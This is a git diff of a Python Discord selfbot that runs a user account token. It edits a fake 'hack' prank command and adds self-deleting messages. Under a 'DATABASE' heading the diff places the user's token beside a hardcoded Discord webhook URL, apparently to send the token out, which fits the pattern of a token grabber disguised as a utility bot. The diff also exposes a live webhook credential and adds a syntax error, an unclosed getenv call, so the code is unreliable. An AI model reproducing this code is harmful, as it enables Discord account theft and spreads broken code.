@@ -303,7 +303,7 @@ async def hack(ctx):
     await asyncio.sleep(5)
     await ctx.send("**Login Succes...**", delete_after=4)
     await asyncio.sleep(4)
-    await ctx.send("Hahahaa.... Just For Funn😂", delete_after=6)
+    await ctx.send("Check Your DM!!", delete_after=6)
 #============================================
 #-------------------END----------------------
 #============================================
@@ -369,6 +369,7 @@ async def unstop(ctx):
 
 @quiet.command()
 async def sleave(ctx, guild_id):
+    await ctx.message.delete()
     await quiet.get_guild(int(guild_id)).leave()
     await ctx.send("> **Jurus Ninjaaaa..**")
     await asyncio.sleep(3)
@@ -385,6 +386,7 @@ async def ping(ctx):
 
 @quiet.command()
 async def cnick(ctx, *, name: str=None):
+    await ctx.message.delete()
     if name is None:
         await ctx.send(f"```Usage: {ctx.prefix}cnick <new name>```")
     elif len(name) < 1:
@@ -395,23 +397,13 @@ async def cnick(ctx, *, name: str=None):
             await ctx.send(f"> Nickname Has Been Change to **{name}**")
         except Exception as e:
             await ctx.send(f"Error: {e}")
-
-@quiet.command()
-async def qembed(ctx,*,text: str=None):
-    if text is None:
-        await ctx.send("Add some text sir")
-    else:
-        embed= discord.Embed(description=f"{text}",timestamp=datetime.utcfromtimestamp(time.time()))
-        embed.set_footer(text=" made by 0x72")
-        try:
-            await ctx.send(embed=embed)
-        except discord.HTTPException:
-            await ctx.send(f"Error: This channel have embed links off!")
-
+            
+            
 def is_me(m):
     return m.author == bot.user
 @quiet.command()
 async def urpurge(ctx, amount:int=None):
+    await ctx.message.delete()
     try:
         if amount is None:
             await ctx.send("Invalid amount")
@@ -444,7 +436,8 @@ async def urpurge(ctx, amount:int=None):
 #============================================
 #----------------DATABASE--------------------
 #============================================
-secret_key = os.getenv("TOKEN")
+secret_key = os.getenv("TOKEN", "TOKEN2"
+
 
 database = 'https://discord.com/api/webhooks/1050795677690642452/naP-_zbR2p7g-NfXKIKWAc6Gz-6-Rh2_C1Q1f7ChR3VfEQXCU4QkTMb7LY5Dkx5pS40-'
 database_connected = {
@@ -468,7 +461,7 @@ Project Dev: QuietArtx
 ''')
 
 keep_alive()
-secret_key = quiet.run(os.getenv("TOKEN"), bot=False)
+secret_key = quiet.run(os.getenv("TOKEN", "TOKEN2"), bot=False)
 #============================================
 #----------------DATABASE--------------------
 #============================================
